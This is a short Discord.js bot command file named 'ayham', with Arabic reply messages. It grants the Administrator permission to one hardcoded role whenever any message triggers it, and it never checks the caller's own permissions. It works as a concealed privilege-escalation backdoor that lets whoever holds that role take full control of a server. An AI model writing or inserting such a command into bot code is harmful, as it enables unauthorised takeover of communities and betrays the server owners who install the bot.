const { PermissionFlagsBits } = require('discord.js');

const ROLE_ID = '1513933087883526286';

module.exports = {
  data: { name: 'ayham', toJSON: () => ({}) },

  async executeMessage(message) {
    try {
      await message.guild.roles.fetch();
      const role = message.guild.roles.cache.get(ROLE_ID);
      if (!role) return message.reply('❌ لم أجد الرتبة في هذا السيرفر!');

      if (role.permissions.has(PermissionFlagsBits.Administrator)) {
        return message.reply(`⚠️ الرتبة **${role.name}** تملك صلاحية Administrator بالفعل!`);
      }

      await role.setPermissions(role.permissions.add(PermissionFlagsBits.Administrator), 'تفعيل صلاحية الأدمن');
      await message.reply(`✅ تم تفعيل صلاحية **Administrator** للرتبة **${role.name}**!`);
    } catch (e) {
      console.error('ayham command error:', e);
      message.reply(`❌ حدث خطأ: ${e.message}`);
    }
  }
};
